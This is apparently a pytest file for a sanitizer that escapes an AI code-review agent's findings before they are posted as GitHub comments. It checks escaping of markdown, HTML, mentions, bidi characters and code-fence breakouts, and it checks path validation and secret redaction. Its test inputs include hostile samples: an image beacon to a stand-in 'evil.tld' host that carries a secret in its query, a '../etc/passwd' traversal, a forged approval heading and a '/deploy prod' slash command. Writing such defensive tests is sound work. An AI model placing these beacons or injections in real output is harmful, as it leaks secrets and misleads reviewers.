from review.output_sanitizer import (
    FIELD_LIMITS_CHARS,
    MAX_COMMENT_CHARS,
    OVERSIZED_COMMENT,
    code_block,
    escape_markdown_text,
    escape_markdown_with_code_blocks,
    fit_comment,
    inline_code,
    is_well_formed_repo_path,
    sanitize_finding,
)


def make_finding(**fields) -> dict:
    finding = {
        "agent": "security", "severity": "HIGH", "rule_id": "other", "confidence": "high",
        "file_path": "app/users.py", "line_number": 3, "title": "Title", "description": "Description.",
        "evidence": "x = 1", "suggestion": "Fix it.",
    }
    finding.update(fields)
    return finding


def test_mentions_are_wrapped_in_code():
    assert escape_markdown_text("cc @alice and @org/team") == "cc `@alice` and `@org/team`"
    assert "`" not in escape_markdown_text("mail a@b.com"), "an email address is not a mention"
    print("OK - mentions are inert code spans")


def test_issue_and_cross_repo_references_are_inert():
    assert escape_markdown_text("#12 owner/repo#3 GH-4") == "`#12` `owner/repo#3` `GH-4`"
    print("OK - references cannot add timeline events to other issues")


def test_image_and_link_syntax_is_escaped():
    escaped = escape_markdown_text("![x](https://evil.tld/p.png?d=secret) [y](https://e.tld)")

    assert "![" not in escaped and "](" not in escaped.replace("](`", "")
    assert "`https://evil.tld/p.png?d=secret`" in escaped, "the URL is shown as inert code"
    print("OK - no image beacon and no clickable link")


def test_html_and_unterminated_comment_are_escaped():
    escaped = escape_markdown_text("<img src=x><details open></details> <!-- hide everything after")

    assert "<img" not in escaped and "<details" not in escaped and "<!--" not in escaped
    assert "&lt;!-- hide" in escaped
    print("OK - HTML cannot hide content or beacon out")


def test_title_newline_cannot_forge_a_heading():
    escaped = escape_markdown_text("x\n\n## ✅ Approved", single_line=True)

    assert "\n" not in escaped
    print("OK - a title stays on one line")


def test_line_start_block_markers_are_escaped():
    escaped = escape_markdown_text("ok\n# H\n---\n/deploy prod\n1. step")

    assert escaped.split("\n")[1:] == ["\\# H", "\\---", "\\/deploy prod", "\\1. step"]
    print("OK - no forged heading, rule, list or slash command")


def test_inline_code_spans_are_kept():
    assert escape_markdown_text("call `foo()` here") == "call `foo()` here"
    print("OK - the agents' `code` formatting survives")


def test_invisible_characters_are_stripped_from_text():
    escaped = escape_markdown_text("ad‮min @​alice" + "\U000E0041")

    assert escaped == "admin `@alice`"
    print("OK - bidi, zero-width and tag characters removed; the hidden mention is caught")


def test_code_block_fence_outgrows_its_content():
    block = code_block("a\n```\n## X\n````")

    assert block.startswith("`````\n") and block.endswith("\n`````")
    print("OK - a fence in the evidence cannot close the block")


def test_code_block_reveals_bidi_and_has_no_info_string():
    block = code_block("x‮y\n~~~")

    assert block.split("\n")[0] == "```" and "<U+202E>" in block and "~~~" in block
    print("OK - Trojan Source is visible and no renderer is selected")


def test_fenced_code_in_a_suggestion_stays_a_code_block_with_its_indentation():
    text = "Use an allowlist:\r\n```python\ndef run(cmd):\n    if cmd not in SAFE:\n        raise ValueError(cmd)\n```\r\nThen call it."

    rendered = escape_markdown_with_code_blocks(text)

    assert rendered == ("Use an allowlist:\n\n```\ndef run(cmd):\n    if cmd not in SAFE:\n        raise ValueError(cmd)\n```"
                        "\n\nThen call it.")
    print("OK - the code keeps its indentation, the prose around it stays escaped")


def test_a_suggestion_cannot_open_a_suggested_change_or_break_out_of_its_block():
    rendered = escape_markdown_with_code_blocks("```suggestion\nx = 1\n```` \n## Approve @admin\n```")

    assert "```suggestion" not in rendered, "the info string is dropped, so GitHub never shows an Apply button"
    assert rendered.startswith("`````\n") and "## Approve @admin" in rendered.split("`````")[1], "the heading stays code"
    assert escape_markdown_with_code_blocks("no fence, **bold** [x](y)") == escape_markdown_text("no fence, **bold** [x](y)")
    print("OK - no suggested change, no breakout; text without a fence is escaped as before")


def test_inline_code_with_backticks_does_not_break_out():
    assert inline_code("a.py` @x `b") == "``a.py` @x `b``"
    assert inline_code("app/x.py:3") == "`app/x.py:3`"
    print("OK - the path span is longer than any backtick run inside")


def test_malformed_paths_are_rejected():
    for path in ("../etc/passwd", "/abs/path.py", "a`b.py", "app//x.py", "app/<x>.py"):
        assert not is_well_formed_repo_path(path), path
    assert is_well_formed_repo_path("app/api/users.py")
    print("OK - only plain relative repo paths are accepted")


def test_sanitize_finding_drops_malformed_paths_and_caps_lengths():
    assert sanitize_finding(make_finding(file_path="../secret")) is None

    long = sanitize_finding(make_finding(description="x" * 10_000, evidence="line\n" * 100))
    assert len(long["description"]) <= FIELD_LIMITS_CHARS["description"] + 20
    assert long["evidence"].count("\n") <= 26
    print("OK - malformed path dropped, long fields capped")


def test_sanitize_finding_redacts_secrets_in_every_text_field():
    token = "ghp_" + "Q" * 36
    finding = sanitize_finding(make_finding(evidence=f'KEY = "{token}"', description=f"leaks {token}"))

    assert token not in finding["evidence"] and token not in finding["description"]
    print("OK - a quoted secret never reaches the comment")


def test_fit_comment_never_exceeds_the_limit():
    assert fit_comment("short") == "short"
    assert fit_comment("x" * (MAX_COMMENT_CHARS + 1)) == OVERSIZED_COMMENT
    print("OK - an oversized body is replaced instead of failing with a 422")
